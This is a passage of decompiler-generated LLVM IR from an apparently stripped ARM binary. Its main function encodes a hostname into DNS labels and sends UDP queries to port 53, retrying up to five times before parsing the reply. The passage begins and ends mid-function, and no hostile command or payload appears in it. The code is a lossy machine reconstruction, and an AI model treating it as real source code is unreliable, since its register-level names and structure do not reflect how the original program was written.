  store i32 %v2_1013c, i32* @r4, align 4
  store i32 %v6_10120, i32* @lr, align 4
  %v0_10140 = call i32 @function_142ec()
  ret i32 %v0_10140
}

define i32 @function_10144(i8* %arg1) local_unnamed_addr {
dec_label_pc_10144:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2240 = alloca i8, align 1
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10144 = load i32, i32* @r4, align 4
  store i32 %v3_10144, i32* %stack_var_-36, align 4
  %v6_10144 = load i32, i32* @r5, align 4
  %v9_10144 = load i32, i32* @r6, align 4
  %v12_10144 = load i32, i32* @r7, align 4
  %v15_10144 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1015c = call i32 @function_14294(i32 1, i32 8)
  %v0_10164 = load i32, i32* @r4, align 4
  %v1_10164 = inttoptr i32 %v0_10164 to i8*
  store i32 %v0_10164, i32* %r0.global-to-local, align 4
  %v3_10168 = call i32 @function_12cdc(i8* %v1_10164)
  %v2_10170 = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_10170, i32* %fp.global-to-local, align 4
  %v2_10174 = ptrtoint i8* %stack_var_-2240 to i32
  %v1_10178 = add i32 %v3_10168, 1
  store i32 %v1_10178, i32* %r0.global-to-local, align 4
  %v2_1017c = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_1017c, i32* %r2.global-to-local, align 4
  store i32 %v2_10170, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_101bc162 = icmp eq i32 %v1_10178, 0
  store i1 %v2_101bc162, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_101c4163 = or i32 %v2_1017c, 1
  store i32 %v1_101c4163, i32* %r1.global-to-local, align 4
  %tmp124164 = icmp slt i32 %v1_10178, 1
  br i1 %tmp124164, label %dec_label_pc_101cc, label %dec_label_pc_1018c.lr.ph

dec_label_pc_1018c.lr.ph:                         ; preds = %dec_label_pc_10144
  %v0_1018c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_1018c.lr.ph, %.thread12
  %v1_101a0176.off0 = phi i8 [ 0, %dec_label_pc_1018c.lr.ph ], [ %extract.t179, %.thread12 ]
  %v0_1018c = phi i32 [ %v0_1018c.pre, %dec_label_pc_1018c.lr.ph ], [ %v1_101b0, %.thread12 ]
  %v2_101d0165 = phi i32 [ %v2_1017c, %dec_label_pc_1018c.lr.ph ], [ %v0_101b8, %.thread12 ]
  %v1_1018c = inttoptr i32 %v0_1018c to i8*
  %v2_1018c = load i8, i8* %v1_1018c, align 1
  %v3_1018c = zext i8 %v2_1018c to i32
  store i32 %v3_1018c, i32* %r3.global-to-local, align 4
  %v2_10190 = icmp eq i8 %v2_1018c, 0
  store i1 %v2_10190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10190, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_1018c
  %v8_10194 = icmp eq i8 %v2_1018c, 46
  store i1 %v8_10194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10194, label %.thread6, label %.thread

.thread:                                          ; preds = %bb
  %v4_10198 = inttoptr i32 %v2_101d0165 to i8*
  store i8 %v2_1018c, i8* %v4_10198, align 1
  %v5_10198 = load i32, i32* %r2.global-to-local, align 4
  %v6_10198 = add i32 %v5_10198, 1
  store i32 %v6_10198, i32* %r2.global-to-local, align 4
  %v0_1019c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1019c.pr.pr, label %.thread..thread6_crit_edge, label %bb122

.thread..thread6_crit_edge:                       ; preds = %.thread
  %v1_101a0.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_101a0.pre to i8
  br label %.thread6

.thread6:                                         ; preds = %.thread..thread6_crit_edge, %bb, %dec_label_pc_1018c
  %v1_101a0.off0 = phi i8 [ %extract.t, %.thread..thread6_crit_edge ], [ %v1_101a0176.off0, %bb ], [ %v1_101a0176.off0, %dec_label_pc_1018c ]
  %v3_101a0 = load i32, i32* %r5.global-to-local, align 4
  %v4_101a0 = inttoptr i32 %v3_101a0 to i8*
  store i8 %v1_101a0.off0, i8* %v4_101a0, align 1
  %v0_101a4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_101a4.pr, label %bb123, label %..thread12_crit_edge

bb122:                                            ; preds = %.thread
  store i32 %v6_10198, i32* %r1.global-to-local, align 4
  %v1_101a4 = load i32, i32* %ip.global-to-local, align 4
  %v2_101a4 = urem i32 %v1_101a4, 256
  store i32 %v2_101a4, i32* %lr.global-to-local, align 4
  br label %.thread12

..thread12_crit_edge:                             ; preds = %.thread6
  %v1_101a410 = load i32, i32* %ip.global-to-local, align 4
  %v2_101a411 = urem i32 %v1_101a410, 256
  store i32 %v2_101a411, i32* %lr.global-to-local, align 4
  br label %.thread12

bb123:                                            ; preds = %.thread6
  %v1_101a8.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_101a8.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb122, %..thread12_crit_edge, %bb123
  %v0_101c0.pre = phi i32 [ %v2_101a411, %..thread12_crit_edge ], [ %v2_101a4, %bb122 ], [ 0, %bb123 ]
  %v0_101b0 = load i32, i32* @r4, align 4
  %v1_101b0 = add i32 %v0_101b0, 1
  store i32 %v1_101b0, i32* @r4, align 4
  %v0_101b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_101b4 = add i32 %v0_101b4, -1
  store i32 %v1_101b4, i32* %r0.global-to-local, align 4
  %v0_101b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_101b8, i32* %r2.global-to-local, align 4
  %v2_101bc = icmp eq i32 %v1_101b4, 0
  store i1 %v2_101bc, i1* %cpsr_z.global-to-local, align 1
  %v1_101c0 = add nuw nsw i32 %v0_101c0.pre, 1
  store i32 %v1_101c0, i32* %ip.global-to-local, align 4
  %v1_101c4 = add i32 %v0_101b8, 1
  store i32 %v1_101c4, i32* %r1.global-to-local, align 4
  %tmp124 = icmp slt i32 %v1_101b4, 1
  %extract.t179 = trunc i32 %v0_101c0.pre to i8
  br i1 %tmp124, label %dec_label_pc_101cc, label %dec_label_pc_1018c

dec_label_pc_101cc:                               ; preds = %.thread12, %dec_label_pc_10144
  %v2_101d0.lcssa = phi i32 [ %v2_1017c, %dec_label_pc_10144 ], [ %v0_101b8, %.thread12 ]
  %v3_1015c = inttoptr i32 %v2_1015c to i8*
  store i32 0, i32* @r4, align 4
  %v3_101d0 = inttoptr i32 %v2_101d0.lcssa to i8*
  store i8 0, i8* %v3_101d0, align 1
  store i32 %v2_10170, i32* %r0.global-to-local, align 4
  %v1_101d8 = bitcast i32* %stack_var_-2228 to i8*
  %v2_101d8 = call i32 @function_12cdc(i8* %v1_101d8)
  %v2_101dc = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_101dc, i32* %r1.global-to-local, align 4
  %v0_101e0 = load i32, i32* %fp.global-to-local, align 4
  %v2_101e0 = add i32 %v0_101e0, %v2_101d8
  store i32 %v2_101e0, i32* @r5, align 4
  %v0_101e4 = load i32, i32* @r4, align 4
  store i32 %v0_101e4, i32* %stack_var_-64, align 4
  store i32 %v2_10170, i32* %r0.global-to-local, align 4
  %v2_101f8 = call i32 @function_12cdc(i8* %v1_101d8)
  %v1_101fc = add i32 %v2_101f8, 17
  store i32 %v1_101fc, i32* %r0.global-to-local, align 4
  %v0_10204 = call i32 @function_fe60()
  store i32 %v0_10204, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r1.global-to-local, align 4
  %v2_10210 = call i32 @function_133f8(i32 %v0_10204, i32 65535)
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_1021c = urem i32 %v2_10210, 65536
  store i32 %v6_1021c, i32* %r3.global-to-local, align 4
  %v2_10224 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10224, i32* %r0.global-to-local, align 4
  %v2_1022c = call i32 @function_12d7c(i32 %v2_10224, i32 16)
  %sext = mul i32 %v2_10210, 16777216
  %v4_10230 = sdiv i32 %sext, 16777216
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %v2_101dc, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v4_10230, i32* %lr.global-to-local, align 4
  %v0_10278 = load i32, i32* @r5, align 4
  %v2_10278 = add i32 %v0_10278, 1
  store i32 %v2_10278, i32* %ip.global-to-local, align 4
  %v2_1027c = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  %v5_10280 = trunc i32 %v4_10230 to i8
  store i8 %v5_10280, i8* %stack_var_-2240, align 1
  %v0_10298 = load i32, i32* @r4, align 4
  %v1_10298 = trunc i32 %v0_10298 to i8
  %v4_10298 = inttoptr i32 %v2_10278 to i8*
  store i8 %v1_10298, i8* %v4_10298, align 1
  %v0_1029c = load i32, i32* @r4, align 4
  %v1_1029c = trunc i32 %v0_1029c to i8
  %v2_1029c = load i32, i32* %ip.global-to-local, align 4
  %v3_1029c = add i32 %v2_1029c, 2
  %v4_1029c = inttoptr i32 %v3_1029c to i8*
  store i8 %v1_1029c, i8* %v4_1029c, align 1
  %v0_102a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_102a0 = trunc i32 %v0_102a0 to i8
  %v2_102a0 = load i32, i32* %ip.global-to-local, align 4
  %v3_102a0 = add i32 %v2_102a0, 3
  %v4_102a0 = inttoptr i32 %v3_102a0 to i8*
  store i8 %v1_102a0, i8* %v4_102a0, align 1
  %v0_102a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_102a4 = trunc i32 %v0_102a4 to i8
  %v2_102a4 = load i32, i32* %ip.global-to-local, align 4
  %v3_102a4 = add i32 %v2_102a4, 1
  %v4_102a4 = inttoptr i32 %v3_102a4 to i8*
  store i8 %v1_102a4, i8* %v4_102a4, align 1
  %v0_102ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102ac, i32* %sl.global-to-local, align 4
  %v2_102b4 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_102b4, i32* @r6, align 4
  %v3_102ec = bitcast i32* %stack_var_-64 to %sockaddr*
  %v4_10308 = bitcast i8* %stack_var_-2240 to i32*
  %v2_10358 = ptrtoint i32* %stack_var_-36 to i32
  %v2_10384 = ptrtoint i32* %stack_var_-48 to i32
  %v6_103e0 = bitcast i8* %stack_var_-4288 to i32*
  %v1_1045c = add i32 %v2_1027c, 12
  %v1_10464 = inttoptr i32 %v1_1045c to i8*
  %v1_10478 = add i32 %v2_1027c, 1
  %v2_10478 = inttoptr i32 %v1_10478 to i8*
  %v1_10494 = add i32 %v2_1027c, 6
  %v2_10494 = inttoptr i32 %v1_10494 to i8*
  %v1_10498 = add i32 %v2_1027c, 7
  %v2_10498 = inttoptr i32 %v1_10498 to i8*
  br label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_1040c, %dec_label_pc_101cc
  %v1_102bc = phi i32 [ %v0_102b8.pre, %dec_label_pc_1040c ], [ -1, %dec_label_pc_101cc ]
  %v7_102b8 = icmp eq i32 %v1_102bc, -1
  store i1 %v7_102b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102b8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_102b8
  store i32 %v1_102bc, i32* %r0.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_102b8, %bb125
  store i32 66244, i32* @lr, align 4
  %v1_102c0 = xor i1 %v7_102b8, true
  call void @__pseudo_cond_branch(i1 %v1_102c0, i32 ptrtoint (i32* @global_var_1369c.26 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_102d0 = call i32 @function_13f90(i32 2, i32 2, i32 0)
  store i32 %v3_102d0, i32* %r0.global-to-local, align 4
  %v7_102d4 = icmp eq i32 %v3_102d0, -1
  store i1 %v7_102d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_102d0, i32* @r7, align 4
  br i1 %v7_102d4, label %dec_label_pc_1044c, label %dec_label_pc_102e0

dec_label_pc_102e0:                               ; preds = %bb126
  store i32 %v2_10224, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_102ec = call i32 @function_13dec(i32 %v3_102d0, %sockaddr* %v3_102ec, i32 16)
  store i32 %v4_102ec, i32* %r0.global-to-local, align 4
  %v7_102f0 = icmp eq i32 %v4_102ec, -1
  store i1 %v7_102f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102f0, label %dec_label_pc_10414, label %dec_label_pc_102f8

dec_label_pc_102f8:                               ; preds = %dec_label_pc_102e0
  %v0_102f8 = load i32, i32* @r7, align 4
  store i32 %v0_102f8, i32* %r0.global-to-local, align 4
  store i32 %v2_10174, i32* %r1.global-to-local, align 4
  store i32 %v1_101fc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10308 = call i32 @function_13f00(i32 %v0_102f8, i32* %v4_10308, i32 %v1_101fc, i32 16384)
  store i32 %v5_10308, i32* %r0.global-to-local, align 4
  %v7_1030c = icmp eq i32 %v5_10308, -1
  store i1 %v7_1030c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1030c, label %dec_label_pc_10414, label %dec_label_pc_10314

dec_label_pc_10314:                               ; preds = %dec_label_pc_102f8
  %v0_10314 = load i32, i32* @r7, align 4
  store i32 %v0_10314, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_10320 = call i32 @function_135ac(i32 3, i32 %v0_10314)
  store i32 0, i32* @r4, align 4
  %v1_10328 = or i32 %v2_10320, 2048
  store i32 %v1_10328, i32* @r2, align 4
  %v0_1032c = load i32, i32* @r7, align 4
  store i32 %v0_1032c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_10334 = call i32 @function_135ac(i32 4, i32 %v0_1032c)
  store i32 %v2_10334, i32* %r0.global-to-local, align 4
  %v0_10338 = load i32, i32* @r4, align 4
  store i32 %v0_10338, i32* %r3.global-to-local, align 4
  %v2_1033c154 = load i32, i32* @r6, align 4
  %v3_1033c155 = add i32 %v2_1033c154, %v0_10338
  %v4_1033c156 = inttoptr i32 %v3_1033c155 to i32*
  store i32 %v0_10338, i32* %v4_1033c156, align 4
  %v0_10340157 = load i32, i32* %r3.global-to-local, align 4
  %v1_10340158 = add i32 %v0_10340157, 4
  store i32 %v1_10340158, i32* %r3.global-to-local, align 4
  %v7_10344159 = icmp eq i32 %v1_10340158, 128
  br i1 %v7_10344159, label %dec_label_pc_1034c, label %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge

dec_label_pc_1033c.dec_label_pc_1033c_crit_edge:  ; preds = %dec_label_pc_10314, %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge
  %v1_10340160 = phi i32 [ %v1_10340, %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge ], [ %v1_10340158, %dec_label_pc_10314 ]
  %v0_1033c.pre = load i32, i32* @r4, align 4
  %v2_1033c = load i32, i32* @r6, align 4
  %v3_1033c = add i32 %v2_1033c, %v1_10340160
  %v4_1033c = inttoptr i32 %v3_1033c to i32*
  store i32 %v0_1033c.pre, i32* %v4_1033c, align 4
  %v0_10340 = load i32, i32* %r3.global-to-local, align 4
  %v1_10340 = add i32 %v0_10340, 4
  store i32 %v1_10340, i32* %r3.global-to-local, align 4
  %v7_10344 = icmp eq i32 %v1_10340, 128
  br i1 %v7_10344, label %dec_label_pc_1034c, label %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge

dec_label_pc_1034c:                               ; preds = %dec_label_pc_1033c.dec_label_pc_1033c_crit_edge, %dec_label_pc_10314
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_1034c = load i32, i32* @r7, align 4
  %v3_1034c = udiv i32 %v0_1034c, 32
  %v3_10354 = mul nuw nsw i32 %v3_1034c, 4
  store i32 %v3_10354, i32* %r3.global-to-local, align 4
  store i32 %v2_10358, i32* %r2.global-to-local, align 4
  %v2_1035c = add i32 %v3_10354, %v2_10358
  store i32 %v2_1035c, i32* @r5, align 4
  %v1_10360 = add i32 %v2_1035c, -156
  %v2_10360 = inttoptr i32 %v1_10360 to i32*
  %v3_10360 = load i32, i32* %v2_10360, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10368 = urem i32 %v0_1034c, 32
  store i32 %v1_10368, i32* @r8, align 4
  %v7_1036c = shl i32 1, %v1_10368
  %v8_1036c = or i32 %v3_10360, %v7_1036c
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_1036c, i32* %v2_10360, align 4
  %v0_1037c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1037c, i32* %stack_var_-48, align 4
  store i32 %v2_10384, i32* @lr, align 4
  store i32 %v2_101dc, i32* %ip.global-to-local, align 4
  %v0_1038c = load i32, i32* @r7, align 4
  %v1_1038c = load i32, i32* %r3.global-to-local, align 4
  %v2_1038c = add i32 %v1_1038c, %v0_1038c
  store i32 %v2_1038c, i32* %r0.global-to-local, align 4
  store i32 %v2_102b4, i32* %r1.global-to-local, align 4
  %v0_10398 = load i32, i32* @r4, align 4
  store i32 %v0_10398, i32* %r2.global-to-local, align 4
  store i32 %v0_10398, i32* %r3.global-to-local, align 4
  %v5_103a4 = call i32 @function_138bc(i32 %v2_1038c, i32 %v2_102b4, i32 %v0_10398, i32 %v0_10398, i32 %v2_10384)
  store i32 %v5_103a4, i32* %r0.global-to-local, align 4
  %v7_103a8 = icmp eq i32 %v5_103a4, -1
  store i1 %v7_103a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103a8, label %dec_label_pc_10424, label %dec_label_pc_103b0

dec_label_pc_103b0:                               ; preds = %dec_label_pc_1034c
  %v2_103b0 = icmp eq i32 %v5_103a4, 0
  store i1 %v2_103b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103b0, label %dec_label_pc_10404, label %dec_label_pc_103b8

dec_label_pc_103b8:                               ; preds = %dec_label_pc_103b0
  %v0_103b8 = load i32, i32* @r5, align 4
  %v1_103b8 = add i32 %v0_103b8, -156
  %v2_103b8 = inttoptr i32 %v1_103b8 to i32*
  %v3_103b8 = load i32, i32* %v2_103b8, align 4
  %v1_103bc = load i32, i32* @r8, align 4
  %v6_103bc = ashr i32 %v3_103b8, %v1_103bc
  store i32 %v6_103bc, i32* %r3.global-to-local, align 4
  %v1_103c0 = urem i32 %v6_103bc, 2
  %v2_103c0 = icmp eq i32 %v1_103c0, 0
  store i1 %v2_103c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103c0, label %dec_label_pc_10424, label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103b8
  store i32 %v2_1027c, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103d4 = load i32, i32* @r7, align 4
  store i32 %v0_103d4, i32* %r0.global-to-local, align 4
  %v0_103d8 = load i32, i32* @r4, align 4
  %v7_103e0 = call i32 @function_13ecc(i32 %v0_103d4, i32* %v6_103e0, i32 2048, i32 16384, i32 %v0_103d8, i32 %v0_103d8)
  store i32 %v7_103e0, i32* %r4.global-to-local, align 4
  %v0_103e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_103e8, i32* %r0.global-to-local, align 4
  %v1_103ec = inttoptr i32 %v0_103e8 to i8*
  %v2_103ec = call i32 @function_12cdc(i8* %v1_103ec)
  %v1_103f0 = add i32 %v2_103ec, 17
  store i32 %v1_103f0, i32* %r0.global-to-local, align 4
  %v0_103f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_103f4 = icmp ult i32 %v0_103f4, %v1_103f0
  %v9_103f4 = icmp eq i32 %v0_103f4, %v1_103f0
  store i1 %v9_103f4, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_103f4, label %dec_label_pc_10404, label %dec_label_pc_10458

dec_label_pc_10404:                               ; preds = %dec_label_pc_103c8, %dec_label_pc_10458, %dec_label_pc_10494, %dec_label_pc_103b0, %dec_label_pc_1044c
  %v0_10404 = load i32, i32* %sl.global-to-local, align 4
  %v7_10404 = icmp eq i32 %v0_10404, 5
  store i1 %v7_10404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10404, label %dec_label_pc_10424, label %dec_label_pc_1040c

dec_label_pc_1040c:                               ; preds = %dec_label_pc_10414, %dec_label_pc_10404
  %v0_1040c = phi i32 [ %v0_1041c, %dec_label_pc_10414 ], [ %v0_10404, %dec_label_pc_10404 ]
  %v1_1040c = add i32 %v0_1040c, 1
  store i32 %v1_1040c, i32* %sl.global-to-local, align 4
  %v0_102b8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_102b8

dec_label_pc_10414:                               ; preds = %dec_label_pc_102f8, %dec_label_pc_102e0
  %v0_10414 = phi i32 [ %v5_10308, %dec_label_pc_102f8 ], [ %v4_102ec, %dec_label_pc_102e0 ]
  %v1_10414 = add i32 %v0_10414, 2
  store i32 %v1_10414, i32* %r0.global-to-local, align 4
  %v1_10418 = call i32 @function_14ac4(i32 %v1_10414)
  store i32 %v1_10418, i32* %r0.global-to-local, align 4
  %v0_1041c = load i32, i32* %sl.global-to-local, align 4
  %v7_1041c = icmp eq i32 %v0_1041c, 5
  store i1 %v7_1041c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1041c, label %dec_label_pc_10424, label %dec_label_pc_1040c

dec_label_pc_10424:                               ; preds = %dec_label_pc_10414, %dec_label_pc_10404, %dec_label_pc_103b8, %dec_label_pc_1034c, %dec_label_pc_104a4, %dec_label_pc_104b0.backedge
  %v0_10424 = load i32, i32* @r7, align 4
  store i32 %v0_10424, i32* %r0.global-to-local, align 4
  %v1_10428 = call i32 @function_1369c(i32 %v0_10424)
  store i32 %v1_10428, i32* %r0.global-to-local, align 4
  store i32 %v2_1015c, i32* %r2.global-to-local, align 4
  %v2_10430 = load i8, i8* %v3_1015c, align 1
  %v3_10430 = zext i8 %v2_10430 to i32
  store i32 %v3_10430, i32* @r4, align 4
  %v2_10434 = icmp eq i8 %v2_10430, 0
  store i1 %v2_10434, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10434, label %dec_label_pc_10590, label %dec_label_pc_1043c

dec_label_pc_1043c:                               ; preds = %dec_label_pc_10424, %dec_label_pc_10590
  %stack_var_-4300.0 = phi i8* [ %v5_105a4, %dec_label_pc_10590 ], [ %v3_1015c, %dec_label_pc_10424 ]
  %v4_1043c = ptrtoint i8* %stack_var_-4300.0 to i32
  store i32 %v4_1043c, i32* %r0.global-to-local, align 4
  %v2_10448 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10448, i32* @r4, align 4
  store i32 %v6_10144, i32* @r5, align 4
  store i32 %v9_10144, i32* @r6, align 4
  store i32 %v12_10144, i32* @r7, align 4
  store i32 %v15_10144, i32* @r8, align 4
  ret i32 %v4_1043c

dec_label_pc_1044c:                               ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10450 = call i32 @function_14ac4(i32 1)
  store i32 %v1_10450, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10404

dec_label_pc_10458:                               ; preds = %dec_label_pc_103c8
  store i32 %v2_1027c, i32* %lr.global-to-local, align 4
  store i32 %v1_1045c, i32* %fp.global-to-local, align 4
  store i32 %v1_1045c, i32* %r0.global-to-local, align 4
  %v2_10464 = call i32 @function_12cdc(i8* %v1_10464)
  store i32 %v2_10464, i32* %r0.global-to-local, align 4
  store i32 %v2_1027c, i32* %ip.global-to-local, align 4
  store i32 %v2_10358, i32* %r1.global-to-local, align 4
  %v4_10474 = load i8, i8* %stack_var_-4288, align 1
  %v5_10474 = sext i8 %v4_10474 to i32
  store i32 %v5_10474, i32* %r3.global-to-local, align 4
  %v3_10478 = load i8, i8* %v2_10478, align 1
  %v4_10478 = zext i8 %v3_10478 to i32
  store i32 %v4_10478, i32* %r2.global-to-local, align 4
  store i32 %v4_10230, i32* @lr, align 4
  %v4_10480 = mul nuw nsw i32 %v4_10478, 256
  %v5_10480 = or i32 %v4_10480, %v5_10474
  store i32 %v5_10480, i32* %r3.global-to-local, align 4
  %v0_10484 = load i32, i32* %fp.global-to-local, align 4
  %v9_10488 = icmp eq i32 %v5_10480, %v4_10230
  store i1 %v9_10488, i1* %cpsr_z.global-to-local, align 1
  %v2_10484 = add i32 %v2_10464, 5
  %v1_1048c = add i32 %v2_10484, %v0_10484
  store i32 %v1_1048c, i32* %r0.global-to-local, align 4
  br i1 %v9_10488, label %dec_label_pc_10494, label %dec_label_pc_10404

dec_label_pc_10494:                               ; preds = %dec_label_pc_10458
  %v3_10494 = load i8, i8* %v2_10494, align 1
  %v4_10494 = zext i8 %v3_10494 to i32
  store i32 %v4_10494, i32* %r2.global-to-local, align 4
  %v3_10498 = load i8, i8* %v2_10498, align 1
  %v4_10498 = zext i8 %v3_10498 to i32
  store i32 %v4_10498, i32* %r3.global-to-local, align 4
  %v4_1049c = mul nuw nsw i32 %v4_10498, 256
  %v5_1049c = or i32 %v4_1049c, %v4_10494
  store i32 %v5_1049c, i32* %r2.global-to-local, align 4
  %v7_1049c = icmp eq i32 %v5_1049c, 0
  store i1 %v7_1049c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1049c, label %dec_label_pc_10404, label %dec_label_pc_104a4

dec_label_pc_104a4:                               ; preds = %dec_label_pc_10494
  %v3_104a8 = mul nuw nsw i32 %v4_10494, 256
  %v5_104ac = or i32 %v4_10498, %v3_104a8
  %v1_10564 = add i32 %v2_1027c, -49152
  %v1_104b0143 = add nsw i32 %v5_104ac, -1
  %v3_104b4144 = mul i32 %v1_104b0143, 65536
  store i32 %v3_104b4144, i32* %r3.global-to-local, align 4
  %v7_104b8150 = icmp eq i32 %v3_104b4144, -65536
  store i1 %v7_104b8150, i1* %cpsr_z.global-to-local, align 1
  %v3_104bc151 = urem i32 %v1_104b0143, 65536
  store i32 %v3_104bc151, i32* @r6, align 4
  br i1 %v7_104b8150, label %dec_label_pc_10424, label %dec_label_pc_104c4.lr.ph

dec_label_pc_104c4.lr.ph:                         ; preds = %dec_label_pc_104a4
  %v1_10640 = add i32 %v2_1015c, 4
  %v2_10640 = inttoptr i32 %v1_10640 to i32*
  br label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %dec_label_pc_104c4.lr.ph, %dec_label_pc_104b0.backedge
  %v3_104bc153 = phi i32 [ %v3_104bc151, %dec_label_pc_104c4.lr.ph ], [ %v3_104bc, %dec_label_pc_104b0.backedge ]
  %v0_10518152 = phi i32 [ %v1_1048c, %dec_label_pc_104c4.lr.ph ], [ %storemerge, %dec_label_pc_104b0.backedge ]
  store i32 %v0_10518152, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_104d017 = inttoptr i32 %v0_10518152 to i8*
  %v2_104d018 = load i8, i8* %v1_104d017, align 1
  %v3_104d019 = zext i8 %v2_104d018 to i32
  store i32 %v3_104d019, i32* %r2.global-to-local, align 4
  %v2_104d420 = icmp eq i8 %v2_104d018, 0
  store i1 %v2_104d420, i1* %cpsr_z.global-to-local, align 1
  %v3_104d821 = mul nuw nsw i32 %v3_104d019, 256
  store i32 %v3_104d821, i32* %r1.global-to-local, align 4
  br i1 %v2_104d420, label %dec_label_pc_10510, label %dec_label_pc_104e0.preheader

dec_label_pc_104e0.preheader:                     ; preds = %dec_label_pc_104c4, %dec_label_pc_104d0.backedge
  %v1_105b4 = phi i32 [ %v1_105b449, %dec_label_pc_104d0.backedge ], [ 1, %dec_label_pc_104c4 ]
  %v0_105ac47 = phi i32 [ %v0_105ac, %dec_label_pc_104d0.backedge ], [ 0, %dec_label_pc_104c4 ]
  %v0_104ec45 = phi i32 [ %v3_104d8, %dec_label_pc_104d0.backedge ], [ %v3_104d821, %dec_label_pc_104c4 ]
  %v0_104e843 = phi i32 [ %v1_105b0, %dec_label_pc_104d0.backedge ], [ %v0_10518152, %dec_label_pc_104c4 ]
  %v0_104e041 = phi i32 [ %v3_104d0, %dec_label_pc_104d0.backedge ], [ %v3_104d019, %dec_label_pc_104c4 ]
  br label %dec_label_pc_104e0

